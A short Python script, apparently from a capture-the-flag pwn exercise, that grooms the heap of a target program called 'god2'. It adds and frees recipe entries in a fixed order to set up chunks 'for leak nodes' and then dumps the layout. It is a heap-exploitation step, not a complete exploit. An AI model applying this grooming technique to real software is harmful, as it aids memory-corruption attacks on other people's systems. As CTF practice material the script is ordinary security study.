import sys,os; sys.path.insert(0,"/mnt/c/Users/ha/Downloads/pwn")
from dumper import G
N=int(sys.argv[1]) if len(sys.argv)>1 else 0
g=G("god2")
# group1 = 3 recipes (0x1b0), groups2-4 = pairs (0x120) for leak nodes
g.add(b"A0"); g.add(b"A1"); g.add(b"B2"); g.cook(b"Beef noodles")
g.add(b"C3"); g.add(b"D4"); g.cook(b"Beef noodles")
g.add(b"E5"); g.add(b"F6"); g.cook(b"Beef noodles")
g.add(b"YY"); g.add(b"Z9"); g.cook(b"Beef noodles")
# free group1 (merge 0x1b0): B2,A1,A0 ; groups: D4,C3 ; F6,E5 ; Z9,YY
for t in b"B2,A1,A0,D4,C3,F6,E5,Z9,YY".split(b","): g.rm(t)
g.add(b"CC")
names=[b"R"*16+b"A",b"SLOTXX",b"FDFDFD"]
for i in range(N): g.add(names[i])
g.dump("1b0 groom N=%d"%N); g.close()
